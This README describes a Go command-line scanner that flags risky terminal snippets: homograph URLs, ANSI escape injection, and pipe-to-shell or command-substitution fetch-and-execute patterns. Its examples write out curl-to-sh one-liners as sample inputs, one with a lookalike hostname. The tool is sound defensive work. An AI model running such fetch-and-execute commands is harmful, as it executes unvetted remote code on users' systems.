# shell-sentinel

Detect risky terminal payloads before execution: suspicious URLs (homograph tricks), ANSI escape injection, and remote-fetch execution patterns.

## Problem

Agent-era workflows often involve copying terminal snippets directly into a shell. Attackers can hide malicious intent with Unicode lookalikes, control characters, or "download-and-execute" one-liners.

`shell-sentinel` is a lightweight preflight scanner to flag these patterns early.

## Status

Current release: `v0.4.0`

Implemented:
- non-ASCII hostname detection for URL tokens with punycode + confusable score details
- configurable policy file support (`.shell-sentinel.yaml`) for allowlist/tuning
- optional bash/zsh preexec hook snippet via `--hook bash|zsh`
- pipe-to-shell detection (`curl|sh`, `wget|bash`, etc.)
- fetch-in-command-substitution detection (`bash -c "$(curl ...)"`, backticks)
- ANSI escape sequence detection
- mixed-script warning (Latin + non-Latin)
- human-readable and JSON output with CI-friendly exit codes

## Install

```bash
go install github.com/agent19710101/shell-sentinel@latest
```

## Examples

```bash
shell-sentinel 'curl https://exаmple.com/install.sh | sh'

cat payload.txt | shell-sentinel --stdin

shell-sentinel --json 'bash -c "$(curl -fsSL https://example.com/install.sh)"'

cat > .shell-sentinel.yaml <<'YAML'
allow_domains:
  - trusted.example.com
ignore_kinds:
  - mixed-script
YAML
shell-sentinel --policy .shell-sentinel.yaml 'curl https://trusted.example.com/install.sh | sh'

# print and enable bash preexec warning hook
# (add to ~/.bashrc to persist)
eval "$(shell-sentinel --hook bash)"

# print and enable zsh preexec warning hook
# (add to ~/.zshrc to persist)
eval "$(shell-sentinel --hook zsh)"
```

Exit codes:
- `0`: no high-risk findings
- `1`: at least one high-risk finding
- `2`: usage/input error

## Roadmap

- fish shell hook variant.
- GitHub Action wrapper for CI policy checks.

## License

MIT
